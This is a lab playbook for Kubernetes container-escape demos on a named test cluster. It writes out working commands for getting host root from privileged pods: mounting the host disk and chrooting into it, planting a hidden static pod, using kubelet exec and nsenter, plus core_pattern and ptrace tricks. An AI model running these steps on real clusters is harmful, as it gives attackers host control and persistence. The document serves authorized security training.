# Escaping with a real workload — lab scenario

Everything below is for the *authorized test cluster* (`k8s-master22` /
`k8s-worker22`, Ubuntu 22.04.5, kernel 5.15.0-173, containerd 1.7.27,
Kubernetes 1.28.15, kubeadm).

> This file is the general playbook. The **verified, step-by-step Calico
> scenario** (mount+chroot → invisible static pod → kubelet-exec) lives in
> `01-privileged-workload-scenario/` — use that for the demo; this file provides the
> surrounding context and alternatives.

## 0. Environment notes for this cluster

- **cgroup**: Ubuntu 22.04 boots **cgroup v2** by default, so the classic
  **cgroup release_agent (v1)** escape will **not** fire without booting with
  `systemd.unified_cgroup_hierarchy=0`. Demo it on a cgroup-v1 node (Ubuntu
  20.04 GA) or reboot the node with that flag, and prefer the other escapes
  here.
- **seccomp**: containerd 1.7.27 applies **no default seccomp** and kubeadm
  does not enable `seccompDefault`. Pods are seccomp-Unconfined by default —
  which is why the core_pattern/unshare tricks all work out of the box.

## 1. Discover attackable pods

```sh
bash find-privileged-pods.sh
bash find-privileged-pods.sh kube-system
```

On this cluster you'll legitimately find:

| Pod                | privileged | hostPID | hostNetwork | Escape surface               |
|--------------------|-----------|---------|-------------|------------------------------|
| `calico-node-*`    | true      | false   | true        | mount+chroot                 |
| `kube-proxy-*`     | true      | false   | true        | mount+chroot                 |
| `etcd/apiserver/...` | false   | false   | true        | (control-plane, hostNet only)|

## 2. Scenario A — realistic: "compromised CNI agent" (privileged calico-node)

No synthetic pod needed: calico-node already runs privileged. This is the
**verified** `01-privileged-workload-scenario` chain — follow its step files:

```sh
# step 1 — mount host root + chroot (helpers/mnt + coreutils)
# step 2 — drop invisible static pod into /etc/kubernetes/manifests
# step 3 — kubelet :10250 exec into the invisible pod + nsenter -t 1 -a
```

Brief form inside `kubectl -n kube-system exec -it ds/calico-node -- sh`:

```sh
# (image lacks mount/tar; use the static helpers/mnt binary)
lsblk || ls /dev/vd*
mkdir -p /mnt/host
# upload mnt helper, then:
/tmp/mnt mount /dev/vda1 /mnt
/usr/bin/coreutils --coreutils-prog=chroot /mnt /bin/bash
# you're now root on the HOST filesystem
ls /var/lib/kubelet /root   # host-only proof — hostname is still the pod's UTS name, not host proof
```

Same flow works in `kube-proxy-*` (privileged) if you prefer that narrative.

## 3. Full namespace escape (hostPID reference)

Mount+chroot on a privileged-only pod is a **host filesystem breakdown** —
for the *full* namespaces escape add `hostPID: true` and `nsenter`:

```sh
nsenter -t 1 -a /bin/bash   # full: host PID1 + net + mount
```

The `01-privileged-workload-scenario` invisible static pod carries `hostPID: true`
+ `hostNetwork` + `privileged`, so its step 3 gives this full escape via the
kubelet exec.

## 4. Classic one-off techniques (context, not yet a scenario dir)

These were prototyped during the lab; they are **documented here for context**
but their manifests/scripts were removed in the restructure (scenario dirs
are the new format — contribute `NN-<target>-scenario/` if you want to keep one):

- **core_pattern puddle**: privileged pod + host `/proc/sys` access → crash a
  child; pipe handler runs as host root. Overlay-upperdir trick:
  `mount | sed -n 's/.*\upperdir=\([^,]*\).*/\1/p'`.
- **ptrace injection**: needs `hostPID: true` + `CAP_SYS_PTRACE` +
  `kernel.yama.ptrace_scope=0`.
- **cgroup release_agent (v1)**: cgroup-v1 node only (see §0).

## 5. Suggested real apps to deploy as a target (if you want more)

Real components (not mocks — deliberately insecurely, for the lab):

- **Calico** (already on this cluster) — the verified scenario. No deployment needed.
- **Fluent Bit** — a real production logging agent (privileged + hostPID +
  hostNetwork + hostPath logs). Use the `fluent-bit` chart/daemonset with
  those settings; image `cr.fluentbit.io/fluent/fluent-bit:2.2` (or `-debug`
  variant with `sh`).
- **Rook-Ceph** (operator + CSI node plugins): genuinely privileged+hostPID,
  but needs block devices / OSDs — heavy for a 2-node lab.
- **node-exporter**: hostPID+hostNetwork, *not* privileged — the
  "low-privilege but shared host namespaces" case (ns/pty info leak, no
  mount escape).

Prefer the **already-existing calico-node** for the headline story.

## 6. Cleanup

```sh
# calico scenario:
rm /etc/kubernetes/manifests/node-telemetry.yaml   # (host root, via chroot)
/tmp/mnt umount /dev/vda1 /mnt                    # unmount host disk
# restore host core_pattern if you used the core_pattern trick:
echo core > /proc/sys/kernel/core_pattern         # on HOST (from escaped shell)
# drop pages / reboot to clear page-cache corruption from dirtyfrag/copyfail demos
kubectl delete ns escape   # optional
```